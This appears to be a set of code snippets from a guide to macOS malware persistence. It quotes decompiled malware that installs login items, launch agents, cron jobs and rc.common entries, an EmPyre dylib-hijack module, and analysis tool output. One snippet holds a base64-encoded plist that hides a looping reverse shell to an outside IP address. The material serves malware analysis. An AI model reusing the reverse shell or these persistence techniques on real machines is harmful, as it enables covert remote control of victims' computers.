["```\nlength = snprintf_chk(&path, 0x400, ...., \"%s%s.app\", &directory, &name);\npathAsURL = CFURLCreateFromFileSystemRepresentation(0x0, &path, length, 0x1); 1\n...\nlist = LSSharedFileListCreate(0x0, kLSSharedFileListSessionLoginItems, 0x0);\nLSSharedFileListInsertItemURL(list, kLSSharedFileListItemLast, 0x0, 0x0, pathAsURL, ... ); 2\n```", "```\n**%** **nm WindTail/Final_Presentation.app/Contents/MacOS/usrnode**\n  ...\n  U _LSSharedFileListCreate\n  U _LSSharedFileListInsertItemURL\n  U _NSApplicationMain\n  ...\n  U _NSHomeDirectory\n  U _NSUserName\n```", "```\nplutil -p *<path to plist**>*\ndefaults read *<path to plist>*\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC ...>\n<plist version=\"1.0\"><dict>\n <key>Label</key>    \n <string>com.foo.bar</string>   \n <key>ProgramArguments</key>\n     <array>        \n    <string>/Users/user/launchItem</string>       \n    <string>foo</string>    \n    <string>bar</string>    \n </array>    \n <key>RunAtLoad</key>    \n1 <true/> \n</dict>\n</plist>\n```", "```\n0x0000db60 \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\n<!DOCTYPE plist PUBLIC \\\"-//Apple Computer//DTD PLIST 1.0//EN\\n\\t\\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n\n<plist version=\\\"1.0\\\">\\n\n<dict>\\n\n    <key>Label</key>\\n\n    <string>%s</string>\\n\n    <key>ProgramArguments</key>\\n\n    <array>\\n\n        <string>%s</string>\\n\n    </array>\\n\n    <key>RunAtLoad</key>\\n\n  1 <true/>\\n\n    <key>KeepAlive</key>\\n\n    <%s/>\\n\n</dict>\\n\n</plist>\\n\", 0\n```", "```\n... \neax = getenv(\"HOME\");\neax = snprintf_chk(&var_6014, 0x400, 0x0, 0x400, \"%s/Library/LaunchAgents/\", eax); 1\n...\neax = snprintf_chk(edi, 0x400, 0x0, 0x400, \"%s%s.plist\", &var_6014, 0xe5d6); 2\n\nedi = open(edi, 0x601);\nif (edi >= 0x0) {\n  write(edi, var_688C, ebx); 3\n  ...\n}\n```", "```\n% **defaults read ~/Library/LaunchAgents/com.mac.host.plist**\n{\n    KeepAlive = 0;\n    Label = \"com.mac.host\";\n    ProgramArguments =     (\n        \"/Users/user/.defaults/Finder.app/Contents/MacOS/Finder\"\n    );\n    RunAtLoad = 1;\n}\n```", "```\n#! /bin/bash\n...\nplist_text=\"PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+S2VlcEFsaXZlPC9rZXk+Cgk8dHJ1ZS8+Cgk8a2V5PkxhYmVsPC9rZXk+Cgk8c3RyaW5nPmNvbS5hcHBsZXMuYXBwcy51cGQ8L3N0cmluZz4KCTxrZXk+UHJvZ3JhbUFyZ3VtZW50czwva2V5PgoJPGFycmF5PgoJCTxzdHJpbmc+c2g8L3N0cmluZz4KCQk8c3RyaW5nPi1jPC9zdHJpbmc+CgkJPHN0cmluZz5lY2hvICdkMmhwYkdVZ09qc2daRzhnYzJ4bFpYQWdNVEF3TURBN0lITmpjbVZsYmlBdFdDQnhkV2wwT3lCc2MyOW1JQzEwYVNBNk1qVTNNek1nZkNCNFlYSm5jeUJyYVd4c0lDMDVPeUJ6WTNKbFpXNGdMV1FnTFcwZ1ltRnphQ0F0WXlBblltRnphQ0F0YVNBK0wyUmxkaTkwWTNBdk1Ua3pMak0zTGpJeE1pNHhOell2TWpVM016TWdNRDRtTVNjN0lHUnZibVU9JyB8IGJhc2U2NCAtLWRlY29kZSB8IGJhc2g8L3N0cmluZz4KCTwvYXJyYXk+Cgk8a2V5PlJ1bkF0TG9hZDwva2V5PgoJPHRydWUvPgo8L2RpY3Q+CjwvcGxpc3Q+\"\n\necho \"$plist_text\" |   base64 --decode1 > \"/tmp/.com.apple.upd.plist\"\n  cp \"/tmp/.com.apple.upd.plist\" \"$HOME/Library/LaunchAgents/.com.apple.upd.plist\" 2\n  launchctl load \"/tmp/.com.apple.upd.plist\" 3\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n<plist version=\"1.0\">\n<dict>\n  <key>KeepAlive</key>\n  <true/>\n  <key>Label</key>\n  <string>com.apples.apps.upd</string>\n  <key>ProgramArguments</key>\n <array>\n   <string>sh</string>\n   <string>-c</string> \n   <string>echo 'd2hpbGUgOjs...RvbmU=' | base64 --decode | bash</string>\n </array>\n 1 <key>RunAtLoad</key> \n <true/>\n</dict>\n```", "```\n% **lldb /Library/mixednkey/toolroomd**\n...\n(lldb) **x/s $rax**\n0x100119540: \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\\n<plist version=\"1.0\">\\n<dict>\\n<key>Label</key>\\n<string>%s</string>\\n\\n<key>ProgramArguments</key>\\n<array>\\n<string>%s</string>\\n<string>--silent</string>\\n</array>\\n\\n<key>RunAtLoad</key>\\n<true/>\\n\\n<key>KeepAlive</key>\\n<true/>\\n\\n</dict>\\n</plist>\"\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>questd</string>\n    <key> 1 ProgramArguments</key> \n    <array>\n        <string>sudo</string>\n        <string>/Library/AppQuest/com.apple.questd</string>\n        <string>--silent</string>\n    </array>\n    <key> 2 RunAtLoad</key> \n <true/>\n    ...\n</dict>\n```", "```\ncmd = 1 'crontab -l | { cat; echo \"0 * * * * %s\"; } | 2 crontab -'\n3 subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()\n```", "```\nsubprocess.call(\"crontab -l > 1 /tmp/dump\",shell=True) \n...\nsubprocess.call( 2 \"echo \\\"* * * * * python ~/.t/runner.pyc \\\" >>/tmp/dump\",shell=True) \n\nsubprocess.call( 3 \"crontab /tmp/dump\",shell=True) \nsubprocess.call(\"rm -f /tmp/dump\",shell=True)\n```", "```\n# **launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist**\n```", "```\n% **ls /etc/periodic**\n\ndaily\nweekly\nmonthly\n```", "```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist ...>\n<plist version=\"1.0\">\n <dict>     \n  <key>LoginHook</key>\n  1 <string>/usr/bin/hook.sh</string> \n </dict>\n</plist>\n```", "```\n<key>LSEnvironment</key>\n<dict>\n <key>DYLD_INSERT_LIBRARIES</key>\n 1 <string>/Applications/Safari.app/Contents/Resources/UnHackMeBuild</string>\n</dict>\n```", "```\n% **otool -l zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib** \n...\nLoad command 11\n          cmd LC_REEXPORT_DYLIB 1\n      cmdsize 96\n         name /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0_COPY.dylib 2\n   time stamp 2 Wed Dec 31 14:00:02 1969\n      current version 1.0.0\ncompatibility version 1.0.0\n```", "```\n$ **reboot** \n\n$ **lsof -p** `<pid of Photo Stream Agent>`\n. . .\n/Applications/iPhoto.app/Contents/Library/LoginItems/PhotoFoundation.framework/Versions/A/PhotoFoundation\n```", "```\nimport base64\nclass Module:\n\n    def __init__(self, mainMenu, params=[]):\n\n        # metadata info about the module, not modified during runtime\n        self.info = {\n            # name for the module that will appear in module menus\n            'Name': 'CreateDylibHijacker',\n\n # list of one or more authors for the module\n            'Author': ['@patrickwardle,@xorrior'],\n\n            # more verbose multi-line description of the module\n            'Description': ('Configures and EmPyre dylib for use in a Dylib hijack, given the \n            path to a legitimate dylib of a vulnerable application. The architecture of the \n            dylib must match the target application. The configured dylib will be copied local \n            to the hijackerPath'),\n\n            # True if the module needs to run in the background\n            'Background' : False,\n\n            # File extension to save the file as\n            'OutputExtension' : \"\",\n\n            'NeedsAdmin' : True,\n\n            # True if the method doesn't touch disk/is reasonably opsec safe\n            'OpsecSafe' : False,\n\n            # list of any references/other comments\n            'Comments': [\n                'comment',\n                'https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x'\n            ]\n        }\n```", "```\n-[AppDelegate addToStartup:(NSString*)item] { \n\n  name = [item lastPathComponent];\n  cmd  = [NSString stringWithFormat:@\"if cat /etc/rc.common | grep %@; then sleep 1; \n              else echo 'sleep %d && %@ &' >> /etc/rc.common; fi\", name, 120, item]; 1\n  [CUtils ExecuteBash:command]; 2\n  ...\n}\n```", "```\n% **plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.151CA171-718D-592B-B37C-ABB9043C4BE2.plist**\n{\n  \"TALAppsToRelaunchAtLogin\" => [\n    0 => {\n      \"BackgroundState\" => 2\n      \"BundleID\" => \"com.apple.ichat\"\n      \"Hide\" => 0\n      \"Path\" => \"/System/Applications/Messages.app\"\n    }\n    1 => {\n      \"BackgroundState\" => 2\n      \"BundleID\" => \"com.google.chrome\"\n      \"Hide\" => 0\n      \"Path\" => \"/Applications/Google Chrome.app\"\n    }\n}\n```", "```\nei_loader_thread:\n0x000000010000c9a0         push       rbp\n0x000000010000c9a1         mov        rbp, rsp\n0x000000010000c9a4         sub        rsp, 0x30\n0x000000010000c9a8         lea        rcx, qword [is_executable]\n...\n0x000000010000c9e0         call     1 get_targets\n0x000000010000c9e5         cmp        eax, 0x0\n0x000000010000c9e8         jne        leave\n...\n0x000000010000ca17         mov        rsi, qword [rax] \n0x000000010000ca1a         call     2 append_ei\n```"]